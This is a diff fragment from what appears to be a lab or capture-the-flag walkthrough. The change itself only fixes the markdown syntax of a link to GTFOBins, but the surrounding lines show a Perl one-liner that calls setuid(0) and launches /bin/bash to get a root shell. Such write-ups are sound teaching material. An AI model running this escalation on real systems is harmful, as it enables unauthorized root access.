@@ -357,7 +357,7 @@ I used Perl to change the UID to `0` and launch Bash:
 ```bash
 perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
 ```
-you can use this (website)[https://gtfobins.org/] for taking the previous script by searching with perl
+you can use this [website](https://gtfobins.org/) for taking the previous script by searching with perl
 
 ##### Result
 I verified the privileges:
